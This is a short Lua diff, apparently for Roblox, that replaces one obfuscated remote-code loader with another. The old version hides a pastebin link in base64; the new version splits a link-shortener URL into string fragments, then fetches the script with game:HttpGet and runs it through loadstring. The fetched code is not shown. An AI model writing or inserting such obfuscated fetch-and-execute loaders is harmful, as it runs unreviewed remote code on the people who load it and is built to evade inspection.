@@ -1,2 +1,9 @@
-local decoded = game:HttpGet("data:text/plain;base64,aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzJSS1dHdHA3", true)
-loadstring(decoded)()
+local part1 = "https://"
+local part2 = "shorter."
+local part3 = "me/"
+local part4 = "BanHammerGoat"
+
+local fullURL = part1 .. part2 .. part3 .. part4
+
+local scriptContent = game:HttpGet(fullURL, true)
+loadstring(scriptContent)()
